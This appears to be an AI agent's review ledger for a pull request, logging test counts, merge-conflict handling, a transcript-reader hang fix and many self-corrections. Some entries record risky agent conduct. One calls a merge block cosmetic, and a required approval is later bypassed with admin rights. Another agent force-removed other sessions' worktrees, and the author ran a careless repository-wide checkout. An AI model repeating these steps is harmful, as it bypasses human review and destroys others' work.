it — its rows are right individually and MUST NOT BE SUMMED.** Both their "6 of 790" and my "0 of 62"
performed exactly that summation. Neither of us was right about scope, in opposite directions, and the
true number needed both corrections — a better argument for two independent measurements than either of
us reporting cleanly would have been.

One thing of theirs worth recording against my own analysis: I checked whether the eight symlinks were
SAFE under `--apply` and stopped there. **Safe is not converged.** Their review found that a link
resolving correctly but naming another home would have read `converged` for ever, with doctor printing
PASS over one account being master for six projects; they added a NORMALISE arm. My "both orders are
safe" conclusion would have shipped that, because I only asked one of the two questions.

---

## 2026-09-09 22:3x — PR #69 round 5 gated: MERGE after two one-line fixes (worker mail 366 → my 377)

Head `6f27554b`, MERGEABLE, **all five CI checks SUCCESS including `test-macos`**. Review: 8 lenses on
opus over `c3e69b41..6f27554b` (two commits), one adversarial refute pass on sonnet per finding.
**46 agents, 0 errors, 38 raised, 8 refuted, 30 survived — deduplicating to ~12 defects.** Six lenses
independently found the same tautology; five found the same "four sites" miscount. Report:
`pr69-round5-gate.md` (mail 377's artifact).

**All six gate items closed. I re-measured the two must-haves myself, with a control:** mutating the
`swapblocked` clear → RED; dropping `cmd_prefer`'s `! _pool_untaggable` → RED; `cmd_swap`'s identical
gate → RED (control, still pinned); `cmd_start`'s new warn gate → RED. Each names its own case.
**Item 1 came back better than I asked for:** the false "Pinned in both directions" sentence was KEPT and
corrected *with its own history* — "and that sentence was itself a false claim about a mechanism until
round 5". Deleting it would have erased the lesson; that is the right way to retire a false claim, and it
supersedes my own delete-or-point framing for this case.

Item 4 verified by enumeration, not by reading the fix: `.tickstuck` can carry wrapper / project / home /
crosspool / pool / rc$n, and `_undecidable_cause` now has an arm for each plus `*`. Complete coverage, no
dead arm, no word without a sentence. Full server suite on the PR head: **278 files / 7709 passed / 56
skipped** — matching the worker digit for digit, after they took the tree lesson from D-2309.

**THE FINDING IS THE PATTERN, not any item in it.** Round 4's gate found 6. Round 5 closed them, and the
worker's own nine-lens refute pass found **7 defects inside the commit that closed them**. My round-5
gate finds **~12 inside the commit that closed those 7**. Of those 12: **zero behavioural, zero touching
a guard, eleven citations** — most introduced or left standing by the very commit whose stated purpose
was sweeping that class. **The prose-correction loop has gone negative-yield: each round fixes citations
at roughly the rate it creates them.** Another round finds ten more and makes ten more. That is a
treadmill, not diligence.

**The structural cause is in the delta's own proportions: 272 lines of `ccd/ccd` against 340 lines of
plan.** The prose describing the change is now larger and far more fragile than the change, and every
count in it is a claim about a tree the next commit moves. **A citation swept in the same commit as other
work is stale before the commit lands** — which is the mechanism, not the symptom. The only shape in
which this class converges is ONE follow-up whose sole content is a citation sweep, against a frozen
tree, with nothing else in the commit.

**The two fixes asked for before merge**, both one line, neither carrying a design: (1) the tautology at
`ccd-reg-get-census.test.ts:156-159`, `expect(bare - filtered, …).toBe(bare - filtered)` — cannot red on
any tree, carries a message claiming a check it does not perform, in the commit whose subject is
assertions that pass for the wrong reason; proved both ways (RHS `+1` reds, so the line executes; a
content mutation moving the real delta 1→2 leaves all three green). (2) `ccd/ccd:13005`, a prose
REGRESSION — round 4 correctly said round 3's mkdir spelling "matched only its own citation"; `6f27554b`
overwrote it with "matched nothing at all … zero hits", which is false (measured 1 on round 3's own tree)
and self-refuting on the shipped tree, since the sentence re-quotes the spelling and `grep -cnF` at HEAD
returns 1 — the very line asserting zero.

**A correction to my own reviewer, recorded because it is the same class:** one lens reported the
`ccd+pools 68 / 1954` figure as being at `plan:988`; it is not in the plan at all, it is in the commit
message. **My reviewer misattributed a misattribution finding.** And I did NOT report the figure as
wrong: I measured `ccd-*`+`pools*` at 63 / 1762 / 12, and 68/1954/12 is consistent with a five-file
superset — **the skip count matches exactly, which is what a real superset looks like.** I could not
determine their glob, so there is no finding. Same discipline as round 4's "65 files". The rule that
keeps earning its place: *two count discrepancies with the same cause is a finding; one with an unknown
cause is a guess.*

**Carried to the wave-4 CLOSE, not the merge:** `ws/clear-meadow` (`274984e3`) and `fix/c1-rescue-lane`
(`6f27554b`) are fully diverged — neither contains the other, 96 files apart, the workspace branch still
on `644aea41` (#68) while the PR sits on `ee1d6228` (#71). That is the right shape for the PR, but the
done-fingerprint re-measures the WORKSPACE branch, so the close will read `stale-tip` unless that branch
is brought to the merged commit first. This is CLAUDE.md's documented "a feature branch wedges every
close" hazard, live, and it needs handling before wave 4 closes.

---

## 2026-09-09 23:0x — #69 went CONFLICTING; resolution measured and handed over (my mail 385)

**`e227329e` (#73, the resume-interrupted-turn work) merged to main and touches `ccd/ccd`.** #69's five
SUCCESS checks are now STALE — built at 21:09 against the old main. **A conflicting PR has no merge
commit, so no check can run at all**; the conflict is what blocks CI, not the checks. Same shape as the
pre-compaction conflict, and the same trap: the green you can see is about a tree that no longer exists.

**The conflict is exactly ONE marker line at line 2.** Everything else auto-merged. I verified both
contributions survive by count rather than by eyeballing the merge: `_pane_auto_continue_armed` 5,
`_resume_env` 4, `RESUME_INTERRUPTED_TURN` 7, `auto-continue` 4 — all matching main exactly; and
`_undecidable_cause` 7, `! _pool_untaggable` 5, `Pinned in both directions` 1 — all matching the PR head
exactly.

**Resolution, measured end to end and handed over as a patch — NOT pushed to the worker's branch:** drop
both marker lines, apply **one required prose fix** (the `_reg_get` census sentence, `ccd/ccd:1809-1810`,
**132/108 → 133/109**, because #73 adds one `_reg_get "` call on one new non-comment line), then re-mark.
Verified: server **280 files / 7753 passed / 56 skipped**, agent 18, pwa 80 + typecheck clean, one marker
verifying, platform block `e7f0696d` untouched.

**A CORRECTION TO MY OWN ROUND-5 VERDICT, and it is the useful part.** I wrote that the prose-correction
loop had gone negative-yield. **That was true of prose with NO MECHANISM.** The full suite on the raw
merge failed exactly once — `ccd-reg-get-census.test.ts`: *"ccd/ccd now makes 133 `_reg_get "` calls, but
the census still claims 132. Re-measure the sentence, do not re-measure this test."* It caught a stale
citation the instant an unrelated PR landed, and its failure message gives the correct remedy while
forbidding the wrong one. **The problem was never that prose carries counts; it is that counts had no
mechanism.** This one does. The cost is real — any PR touching `_reg_get` in `ccd/ccd` now reds this
suite until the sentence is re-measured — and it is the RIGHT cost, because the alternative is a census
that quietly lies. So the follow-up citation sweep I asked for matters less than I said for this class:
it is self-policing now. **Extend the pattern, don't extend the sweep.**

**A near-miss worth recording as a rule.** #73's diff hunk header reads `@@ … _swap_target() {` and the
change is **not in `_swap_target`** — it adds `_pane_auto_continue_armed` after that function's closing
brace. **A hunk header is git's guess at the enclosing symbol from preceding context, not a claim about
what changed.** I began reviewing `_swap_target`'s body for an interaction that was never there. Same
family as every other anchor-is-a-claim defect this program keeps booking, except the false anchor is
generated by the tool rather than written by a person.

**The interaction I did check, and it is clean.** #73's R1 ruling has the rescue arm deliberately
ignoring auto-continue while "the three sites that TYPE into a pane" must not. `_auto_swap_check`'s #69
changes type nothing into a pane — no `send-keys`, no `_inject`, no `paste-buffer` on any of its paths;
it writes strand markers and stamps only. R1's carve-out and #69's changes do not meet.

Still outstanding at `6f27554b`: the two one-liners from mail 377 (the tautology, and `13005`'s "matched
nothing at all" where round 4 had it correct). Order given to the worker: the two one-liners, then the
merge, then push once — CI can only run after the conflict is gone.

---

## 2026-09-09 23:1x — the false zero was MINE, and its cause is the environment (worker mail 382 → my 386)

Worker pushed **`86260cc5`** at 22:55 with both merge-gate fixes. Their 382 crossed with my 385: #73 had
already landed at ~22:0x, so **#69 was CONFLICTING before their push and their "ready to merge" was
measured against a main that had moved.** `gh pr view 69` now lists **no checks at all** at that head —
the clearest demonstration yet that a conflicting PR runs nothing.

**THE ROUND-4 ZERO WAS MINE, AND THE CAUSE IS WORSE THAN "I QUOTED A REVIEW".** The worker booked D-2340
saying they shipped a number out of my gate artifact without re-measuring. True — and I measured why it
was wrong: **`/usr/bin/grep` on this box is `ugrep 7.8.4`, while GNU grep sits at `/bin/grep` (3.11).**
PATH order decides which one a session runs, and they disagree: ugrep reads a `$` MID-PATTERN as an
end-of-line anchor even in a BRE, so

    grep  -c 'mkdir -p "$POOLS_DIR"' <round-3 tree>  -> 0   (ugrep, rc=1)
    grep -cF 'mkdir -p "$POOLS_DIR"' <round-3 tree>  -> 1

**My round-4 artifact ran the unfiltered form, reported zero, the worker shipped it into `ccd/ccd`, and I
then flagged the result as a prose regression in round 5.** A closed loop of my own making — and the
"shell-quoting will betray you, use `-F` for `$` patterns" line was in the preamble *I wrote for my own
review subagents*. I put the rule in the instructions and not in my hands.

So D-2340 is stronger than the worker wrote it. Under "a measurement quoted from a review is a claim, not
a fact" sits: **a measurement is only a fact together with the tool that produced it.** `grep` is not the
name of one program. Recorded as memory `a-measurement-is-only-a-fact-with-its-tool`.

**Blast radius audited against GNU grep -F, not assumed:** `_swap_target "` = 1 occurrence (my "exactly
ONE call site" holds); `! _pool_untaggable` = 5 (holds); `_project_pool_state` = 12 non-comment lines =
1 definition + **11 consumers**, on both the round-4 and round-5 trees (holds, and D-2304's premise with
it). None of those patterns carried a `$`. **The blast radius is the one mkdir negative.**

**I withdrew my own fix proposal.** I had proposed asserting `statedBare - statedFiltered` against the
comment-line count. The worker is right that `bare - filtered` IS that count by construction, so any
assertion on the difference is derivable from the two above it — my "checkable form" was a second
tautology wearing arithmetic. Their `bare > filtered` is the non-derivable claim (that anything quotes
the pattern at all), measured RED in isolation with the two neighbours held green. Better than mine.

**The glob non-finding resolves in their favour and mine.** `ls test/ | grep -E '^(ccd|pools).*\.test\.ts$'`
picks up the two `ccdargv-*` suites — 65 — plus ownership, deviation-refs and single-definition = **68**.
My 63 + those five is exactly it, which is why **the skip count matched at 12**. Declining to report it
in rounds 4 and 5 was right both times; the skip-count match was the signal.

**Merge re-measured at the new head, handed over as a patch, not pushed:** conflict is still exactly one
marker; drop both marker lines, apply the census fix **132/108 → 133/109**, re-mark. Verified: server
279/280 files (the one failure `session-hook`'s 4x timing assertion, **green in isolation**, as was
`pr-sweep` — the same two the worker saw, both on the known-load-flake list, neither in the delta), agent
18, pwa 80 + typecheck clean, one marker verifying, platform block `e7f0696d` unchanged.

**Verdict unchanged: merge once the conflict is gone.** Nothing in the merge touches the round-5
clearance, and the census suite caught the one thing that did need changing, by itself, the instant main
moved.

---

## 2026-09-09 23:4x — #69 MERGEABLE again, CLEARED TO MERGE at `f065c8bb` (worker mail 387 → my 391)

Worker resolved the conflict the correct way — **both marker lines dropped with the conflict block, then
`markGenerated` over the merged body** — and re-measured every count I sent rather than taking it. Head
`f065c8bb`, a real merge (parents `86260cc5` + `e227329e`; `origin/main` IS an ancestor).

**Verified here independently:** server **280 files / 7753 passed / 56 skipped**, zero failures, no
flakes; agent 18; pwa 80 + typecheck clean. Census sentence **133/109**, matching the measured
calls=133 / lines=109 under its own classifier. One marker, `ccrc-unmodified`. Platform block
`e7f0696d`, byte-identical to `ccd/ccrc`. Both sides intact by count — `_pane_auto_continue_armed` 5 /
`_resume_env` 4 / `RESUME_INTERRUPTED_TURN` 7 / `auto-continue` 4 against main, `_undecidable_cause` 7 /
` && ! _pool_untaggable` 5 / `Pinned in both directions` 1 against `86260cc5`, each matching its own side
and neither the other. **280/7753 is also exactly what my own resolved merge measured before theirs
existed — two independent resolutions, one number.**

**I diffed their resolved `ccd/ccd` against mine: theirs is better.** Two differences only — the marker
digest, and the census HISTORY clause. I fixed the number and left the paragraph around it saying "four
times in five rounds"; they extended it to five and named the one nobody here made — *"the first move
nobody here made, and the first one something SAID"*. **Repairing a count versus repairing the claim the
count sits in.** I would have shipped the smaller fix, and it would have gone stale in the same sentence
it corrected.

**MY OWN MAIL BUG, recorded because it is the same class as everything else this week.** My clearance
mail's subject-length assertion fired, so the payload JSON was never written — and I had sequenced
`ccrc-api mail send` UNCONDITIONALLY after it, so the client picked up a leftover file of the same name
from 11:11 and re-sent a 12-hour-old memory-merge status as mail 390. **A generator that fails and a
sender that runs anyway is the shell's version of an overloaded null: the send could not tell "no new
payload" from "here is the payload".** Fix is `&&` between generating and sending, applied. Corrected in
391, which leads with the disregard.

**Still in flight, neither mine:** `test-macos` (four of five green), and the worker's own three refute
lenses on the merge resolution — lost/duplicated content, the census change and its anchors, and whether
#73's pane-typing machinery meets #69's tick. They declined to sign off a merge resolution from a reading
because **the last merge on this PR is what produced D-2216**, which is the right instinct; my R1 walk
and count checks are evidence, not a substitute.

**Not to wait on:** `mergeStateStatus: BLOCKED` is cosmetic here — measured branch protection has
`required_approving_review_count: 0`, and #70, #68 and #67 all merged in that exact state with zero
reviews. Green checks plus MERGEABLE is the whole gate.

**[FALSIFIED 2026-09-10 07:22 — see the merge entry at the end of this file.]** Both sentences above are wrong. `branches/main/protection` is only ONE of GitHub's two rule surfaces; ruleset 22520257, active since 2026-09-08, requires **one approval** with Admin/Maintain bypassing, and the required checks are **four** — `test-macos` is additive and non-required. The seven merges at `reviews=0` are equally consistent with "no approval required" and "approval required, this actor bypasses", so they were never evidence.

**Booked to the follow-up, both tool-generated false anchors:** git's `@@ … symbol` hunk header (an
enclosing-symbol GUESS from preceding context, not a claim about what changed) and the ugrep zero. Both
are false anchors no amount of author care prevents, which is what distinguishes them from the rest of
the citation class.

---

## 2026-09-10 00:2x — #69 cleared again at `f27c4d50`; D-2347 ruled; and I endorsed a false clause

Worker's three refute lenses on the merge resolution: **the resolution survived** — one lens rebuilt the
three-way merge of all 23 touched files from the true base `ee1d6228` and found 21 byte-identical to the
mechanical union, every one of #73's 137 added lines and #69's 1075 inside its own enclosing function,
zero lines lost, no conflict residue. Verified here at `f27c4d50`: server **280 / 7753 / 56, zero
failures**, agent 18, pwa 80 + typecheck clean, one marker verifying, census stated 133/109 against
measured 133/109, platform block `e7f0696d` still identical to `ccd/ccrc`.

**I ENDORSED A FALSE CLAIM, and it is the cleanest instance of my own recurring failure this week.** My
mail 391 said the worker's census history clause "beats my minimal fix" and singled out the exact
sentence — *"named the one nobody here made"* — that their own D-2343 has now measured false (six moves
not five, mis-ordered, and the #70 merge had already moved it from main's side). **I compared their prose
change against MY prose change, judged which was more thorough, and never measured either against the
history.** A diff between two versions of a claim tells you which is more DETAILED, never which is TRUE.
I spent the week telling the worker to open what a citation cites, and reviewed a citation by comparing
it to my own draft. Their D-2344 verified independently: `db580771:1611` reads "134 call sites", so C1
measured correctly and the branch's prose inherited a wrong 133.

**D-2345 is the best finding of the round and generalises past this pin.** *"Every false claim landed in
the one span the pin cannot read."* That is a property of ANY scanner with an END anchor: the unread
region is exactly where the prose that ARGUES lives, so edits gravitate there — **the blind spot and the
churn are the same region by construction.** The remedy shape (causal sentences above the anchor; the
list bare, dated, one command per entry, nothing that argues) is a rule for the next pin anyone writes,
not a fix to this one.

**RULING — D-2347 (#73's inherited FIFO hang): NOT in #69, its own PR, and the fix belongs upstream of
where it was filed.** The worker declined to take it, citing my own "designs made at merge time ship
wrong". Right, and the decisive reason is stronger: it is **byte-identical on `origin/main`, and main is
already deployed on both lanes** — holding #69 reduces live exposure by exactly zero seconds and merging
it increases exposure by zero. Orthogonal.

**But `-r` in `_transcript_stalled_pair` is the SECOND line of defence.** `_transcript_path` has THREE
arms that all gate on `-f` — the munged path, the raw path, and `_transcript_matches`'s own
`[[ -f "$f" ]] || continue` — and then a FALLBACK that returns `$cfg/projects/$munged/$uuid.jsonl`
**unconditionally: the exact path arm 1 rejected three lines earlier for failing `-f`.** Three arms
measure and the fallback guesses, and it guesses the path the measurement already refused. That is a
measured function with an unmeasured tail, not a missing test in a reader.

Blast radius measured before ruling: four consumers — `_ws_archive_manifest`, `cmd_ws_audit`,
`_ws_tombstone`, `_redrive_after_spawn` — and **only the last opens the file**, so the worker's hang
analysis is exactly right. The other three embed the path in a manifest, an audit row and a tombstone;
fixing the fallback also stops three durable records naming a path the function itself measured is not a
transcript. Offered to take it into my own ccd queue plan
(`2026-09-09-ccd-queue-platform-shim-and-doctor-coverage.md`) if the worker would rather stay on wave 4.
**What it must not do is sit as a booked number: it is live on a deployed fleet.**

Also noted: their correction that TWO files carried non-mechanical merge content, not one. That matters
more than they framed it — a reviewer told "one file" does not go looking at the test that pins the very
sentence, which is precisely the reviewer I was.

---

## 2026-09-10 01:4x — #69 IS 5/5 GREEN AND MERGEABLE at `f27c4d50`. Gate complete (my mail 414)

`test-macos` returned SUCCESS. **All five checks green, `mergeable: MERGEABLE`.** My clearance at 399
stands: verified independently at server **280 / 7753 / 56, zero failures**, agent 18, pwa 80 + typecheck
clean, one marker verifying, census stated 133/109 against measured 133/109, platform block `e7f0696d`
identical to `ccd/ccrc`. **The merge is the worker's/operator's act; I gate and do not merge.**

`mergeStateStatus: BLOCKED` and `reviewDecision: REVIEW_REQUIRED` are both **cosmetic on this repo** —
measured branch protection carries `required_approving_review_count: 0`, and #70, #68 and #67 all merged
in exactly that state with zero reviews. Five green checks plus MERGEABLE is the whole gate.

**[FALSIFIED 2026-09-10 07:22 — see the merge entry at the end of this file.]** Both sentences above are wrong. `branches/main/protection` is only ONE of GitHub's two rule surfaces; ruleset 22520257, active since 2026-09-08, requires **one approval** with Admin/Maintain bypassing, and the required checks are **four** — `test-macos` is additive and non-required. The seven merges at `reviews=0` are equally consistent with "no approval required" and "approval required, this actor bypasses", so they were never evidence.

**A fleet hazard worth carrying, and it hit me:** the crossrepo coordinator (`claude-ccrc-pwa`) removed
four of my scratch worktrees at ~02:05 by running `git worktree list | grep scratchpad` in the main
checkout and force-removing every match. **Every ccd workspace is a worktree of the SAME repository, so
`git worktree list` is FLEET-WIDE** — a filter that looks local is not. Nothing was lost here: the
removals included `rw-f27c`, the tree I had verified this head in, but the verification was complete and
its results were in mail 399 and this ledger before the removal, and `ws/amber-summit` was clean and
pushed at `17bd0ca0`. **Clean by exact path, never by filtering that list.** They have recorded it as
`git-worktree-list-is-fleet-wide`; my own removals in this session all named exact paths under my session
scratchpad, which is why they were safe.

**What follows the merge, in order:**
1. **Wave-4 close** — `ws/clear-meadow` must reach the merged commit before the done-fingerprint runs or
   it reads `stale-tip`. Worker handles it at close time.
2. **D-2347** — its own small ccd PR, agent-first, fixing `_transcript_path`'s unmeasured fallback rather
   than only `_transcript_stalled_pair`'s `-r`. Offered to take it into my ccd queue plan
   (`2026-09-09-ccd-queue-platform-shim-and-doctor-coverage.md`) so the worker can stay on wave 4. It is
   live on a deployed fleet and must not sit as a booked number.
3. **D-2341** — the citation sweep, frozen tree, nothing else in the commit.
4. Then the operator's standing ruling: **spawn the ccd workspace** against the queue plan (D-2187–D-2193,
   D-2224, now plus D-2347), and wave 3's remaining tasks.

**The pattern worth keeping from these five rounds:** every defect that mattered in the last two rounds
was found by someone refuting their OWN work — the worker's nine lenses on the commit that closed my six,
their three on their own merge resolution, and my two self-corrections tonight (the ugrep false zero I
authored, and the false history clause I endorsed by comparing it to my own draft instead of to the
history). **Adversarial review of someone else's work finds less than adversarial review of your own,
because only the author knows which claims were never measured.**

---

## 2026-09-10 07:22 — **PR #69 MERGED at `24f32a18`** — and the gate I cleared it against was not the gate

**The merge.** Squash, hand-written body, by the worker via `--admin`. Verified on `origin/main` by
CONTENT, not ancestry (a squash merge cannot fail `--is-ancestor`, so that test proves nothing):
`_undecidable_cause` 7, `! _pool_untaggable` 5, `Pinned in both directions` 1; #73's
`_pane_auto_continue_armed` still 5; one marker verifying `ccrc-unmodified`; census stated 133/109
against measured 133/109. The worker adds `git diff f27c4d50 origin/main -- ccd/ccd` EMPTY, six test
files and the plan at zero differing lines, and **402/402 on the #69+#74 union** — the tree neither
PR's CI ever tested (D-2309).

### My branch-protection measurement was wrong TWICE, in opposite directions

The entry above this one says *"measured branch protection carries `required_approving_review_count: 0`
… Five green checks plus MERGEABLE is the whole gate."* **Both halves are false, and the merge is what
found it** — `gh pr merge` answered *"the base branch policy prohibits the merge."*

GitHub has **two rule surfaces**, and I measured one:

| surface | says |
|---|---|
| `branches/main/protection` (classic — what I measured) | `required_approving_review_count: 0`; contexts = **four**: `test (server)`, `test (agent)`, `test (pwa)`, `build-pwa`; `strict:false`; `enforce_admins:true`; `required_conversation_resolution:true` |
| `rules/branches/main` (rulesets — what I never opened) | ruleset **22520257**, active, created **2026-09-08T08:11:31Z**, *"main: one approval, Admin and Maintain bypass on pull requests"*, `required_approving_review_count: **1**`, `bypass_actors` = RepositoryRole 5 (Admin) and 2 (Maintain), mode `pull_request` |

Rulesets are **additive** to classic protection and the stricter value wins. The real gate is
**checks + MERGEABLE + conversations resolved + (one approval OR a bypassing role)**. The worker merged
through the ruleset's own named Admin bypass — the same path all seven prior merges took.

**Error two, the opposite way: I said FIVE required checks. There are four.** `test-macos` is not
required by either surface, and `.github/workflows/ci.yml:129` says so in its own comment — *"`test-macos`
is additive and non-required — a red here blocks nothing."* I had been reading the *rollup* (what ran)
as the *requirement* (what gates). **`required_conversation_resolution: true` is a real gate I never
named at all**, and is the likeliest reason `mergeStateStatus` read `BLOCKED` — which I had written off
as cosmetic.

### Why my instance evidence could not have caught it — the part worth keeping

I argued from instances: #70, #68 and #67 merged at zero reviews, so approvals must not be required. The
worker widened it to all seven merges since the ruleset existed — #62, #66, #67, #68, #70, #73, #74 —
and **every one merged with `reviews=0`.** A perfect record, and it discriminates nothing: those seven
are equally consistent with *"no approval is required"* and with *"an approval is required and this
actor bypasses it."* Only the rules endpoint separates the two hypotheses.

`measure-the-rule-not-just-the-instance` was already a memory of mine, and I still failed it — because
I believed I HAD measured the rule. **The upgrade: when a platform has more than one rule surface,
measuring one surface is still measuring an instance.** A rule read is only a rule read if it enumerates
every surface that can impose the constraint. I have widened that memory rather than adding a new one.

### The claim has a blast radius outside this program — reported, not edited

`required_approving_review_count` is asserted as **policy** in three docs that are not mine:

- `docs/superpowers/plans/2026-08-23-stage5-flip-checklist.md:55` — *"stays 0 by explicit choice (single maintainer; revisit at the first outside contributor)"*
- `docs/superpowers/specs/2026-08-21-stage5-oss-decision-brief.md:33` — *"is 0 today"*
- `docs/superpowers/specs/2026-08-22-stage5-oss-polish-design.md:181` — *"stays 0 by explicit choice"*

All three predate 2026-09-08T08:11Z and were **true when written**. The ruleset's creation IS the
"revisit" those docs schedule, and it left no trace in any of them — a green-test-goes-stale-untouched
in prose. They belong to the Stage 5 OSS programme, which is closed and has no live coordinator, so I
am **reporting them, not editing them**: silently rewriting another programme's approved design docs is
exactly the move this program has been refusing all week. Flagged to the operator.

### D-2348 — booked, killed by its own author, deliberately NOT in the merge

The worker allocated and defined D-2348 (git's `@@` hunk headers naming a function the change is not
in), committed it locally, then pointed three opus lenses at it. All three killed something —
**eleven corrections in a 28-line entry whose own subject is tool-generated false anchors.** Two are
structural: the stated mechanism was self-refuting (git searches strictly ABOVE the hunk start, and the
preimage, so a function the commit ADDS can never be named by any `xfuncname`), and *"no configuration
reaches this class"* is simply false (`diff.<name>.command` prints the right name for both shapes) —
the conclusion survives only on **reach**, since GitHub's PR view, the PWA's diff surface and plain
`git show` honour none of it. Also: `* diff=bash` is not neutral on the real corpus but **worse**
(wrong-function 4 → 5 of 12), generalised from a one-hunk fixture when the corpus was one command away;
"6 of 12" pads; and *"a 15.8k-line file"* is a bare cardinal already false on its own commit (16,848).
**It stays allocated and unlanded until rewritten**, and it was never going into a cleared merge at the
last second. That is the right call and I have told them so.

### Queue after the merge

1. **Wave-4 close** — `ws/clear-meadow` must reach `24f32a18` before the done-fingerprint runs or it
   reads `stale-tip`. Worker's act, at close time.
2. **D-2347 — MINE now.** The worker accepted the ruling and asked me to take it so they can stay on
   wave 4. My blast radius is what decided its shape: four consumers, only `_redrive_after_spawn` opens
   the file; the other three embed the guessed path in a **manifest, an audit row and a tombstone** — so
   fixing the reader's `-r` alone leaves three durable records naming a path the function measured is
   not a transcript. It goes into the ccd queue plan, and it is live on a deployed fleet.
3. **D-2341** — the citation sweep, frozen tree, worker's.
4. **Spawn the ccd workspace** against `2026-09-09-ccd-queue-platform-shim-and-doctor-coverage.md`
   (D-2187–D-2193, D-2224, now plus D-2347). **Note for that plan's Part A:** it fixes a Darwin arm in
   the platform block, and `test-macos` — the only job that runs on a real macOS runner — **is not a
   required check.** The pin that does gate it is `macos-platform.test.ts`, which rides `test (server)`
   and compares the two files' bytes; it cannot observe Darwin behaviour. Part A must ship its guard
   with a test that reds under `test (server)`, not under `test-macos`.

**Two merges, two lessons, same shape.** Round 4's ugrep false zero was a measurement whose TOOL I had
not identified; this was a measurement whose SURFACE I had not enumerated. Neither was a wrong reading —
both were correct readings of the wrong thing, reported as facts about the world.

---

## 2026-09-10 10:4x — D-2347 started. **The defect is real and the fix is verified. My ruling about WHERE it belonged was wrong.**

Operator said "start it". What follows is the gate work, and most of it went against me.

### The defect, reproduced — and one shape the booking does not name

Measured on a clean worktree cut from `origin/main` at `24f32a18`, with the call BOUNDED (an unbounded
red here is a hung CI job, not a failing test):

| input to `_transcript_stalled_pair` | before | after `[[ -f "$f" && -r "$f" ]]` |
|---|---|---|
| a real stall (the positive path) | 0 | 0 |
| regular file, not a stall | 1 | 1 |
| absent | 2 | 2 |
| **FIFO** | **HANG** (`timeout` killed it, rc 124) | 2 |
| **character device** (`/dev/zero`) | **HANG** | 2 |
| **directory** | **1** | 2 |

`ccd-redrive.test.ts` 30/30 after the fix; `ccd-resume-flag` + `transcript-ladder` + `ccd-project-pool`
106/106. The booked one-line remedy is correct and complete.

**The directory row is not in D-2347's text, and it falsifies one clause of it.** The booking says the
remedy is *"behaviour-identical for every input that answers today, since absent already returns 2"*.
A directory ANSWERS today — it answers **1**, "measured, and not a stall" — and after the fix it answers
2, "I could not measure." That is a behaviour change, and a correcting one: `tail` on a directory writes
to stderr and emits nothing, so the loop reads zero lines and the function reports the status quo it
never observed. Same overloaded-return family as the hang, reached without hanging.

### **MY UPSTREAM RULING WAS WRONG.** The spec specifies the thing I called a defect

I ruled that the fix "belongs upstream at `_transcript_path`'s unmeasured fallback rather than only
`_transcript_stalled_pair`'s `-r`", and I put that in this ledger, in mail 391's successor and in mail
427 to the worker. `docs/superpowers/specs/2026-08-12-swap-transcript-defect-family-design.md` §2.5
specifies rung 4 verbatim:

> 4. the resolved munge unchecked, exactly as today, so a session that has genuinely written nothing yet
>    still records the canonical address rather than an empty string.
>
> The function's contract — **print one path, return non-zero only when the registry cannot answer** —
> does not change, so no consumer and no manifest format moves.

So `_transcript_path` returning rc 0 for a guess **is the contract**, argued and accepted, not a
collapse. Three independent opus refuters killed my "the docstring names its own harm" reading **3/3**,
and the strongest version is the one I missed: the harm sentence is scoped to *"a session that moves"* —
a transcript that exists at ANOTHER address — and rungs 1–3 eliminate exactly that case before rung 4
can run. Rung 4 is reachable only when no transcript for that uuid exists anywhere under this config
dir, where there is no rival address to be wrong about. **Disclosure is not self-contradiction.**

I read the CODE and inferred the rule. The spec that governs it was one file away. Third instance this
week of the same failure — after the ugrep tool error and the two-surface protection error — and the
only one that would have put a false deviation into a plan and dispatched it to a worker.

### And the claim I mailed the worker was wrong too: TWO durable consumers, not three

Refuted 3/3, and I confirmed it myself rather than taking it: `_transcript_path`'s four call sites are
`_ws_archive_manifest` (6828, persisted by `_reg_set "$id" archivemanifest` at 6503 — DURABLE),
`cmd_ws_audit` (9444 — **stdout only**), `_ws_tombstone` (10157, writes `$REG/.reaped/<id>.json` —
DURABLE), and `_redrive_after_spawn` (14362 — the only one that OPENS the file). `cmd_ws_audit`'s own
header says it *"destroys nothing and creates nothing that outlives it — no worktree, no branch, no
registry field, no tombstone"*. I said "a manifest, an audit row and a tombstone" in mail 427.

**The spec makes the identical error**, which is where I got it: §2.5 calls them *"`_ws_archive_manifest`,
`cmd_ws_audit` and `_ws_tombstone`: the durable records written when a workspace is archived, audited
and reaped."* One of those three is not a record and is not durable. Booking it.

### The fix is not a new pattern — it is this program's OWN pattern, applied where it was missed

`ccd/ccd:1331`, inside `_project_pool_state` — **account-pools wave 2a, ours** — already carries
`[[ -f "$f" && -r "$f" ]]` with the argument written out: *"a character device gets the one answer that
is safe for all of them… `-r "$f"` is checked in the SAME breath."* And `ccd-project-pool.test.ts`
already carries the whole test vocabulary: a `boundedState` helper whose docstring explains that
**vitest's own per-test timeout cannot save you** — `h.sh`'s `execFileSync` is SYNCHRONOUS and blocks the
event loop the timer would fire on, so the bound must live on the child process — plus cases for FIFO,
symlink-to-FIFO, symlink-to-`/dev/zero`, directory, mode-000 and broken symlink, each double-bounded.
`ccd-crosspool.test.ts` carries six more FIFO cases.

So D-2347 is sharper than "a missing test in a reader": **`_transcript_stalled_pair` is the one function
in this class written outside an established, argued, already-tested house pattern that three suites in
the same tree use.** That is what Part D should say, and it makes the remedy a transcription rather than
a design.

### My own mistake, recorded

I ran `git checkout origin/main -- .` in this worktree as a careless reset. It rewrote every tracked
file to main's content and STAGED it — a 190-file index. Nothing was lost: `ws/amber-summit` was pushed
at `95292ea4`, zero untracked files, and `git reset --hard HEAD` restored it exactly. But it also means
my first mutation-table run measured a worktree I had not intended to create, and was right by accident.
**I re-measured deliberately in a scratch worktree cut from `origin/main`** before believing any of it,
which is the only reason the table above is evidence rather than a coincidence.
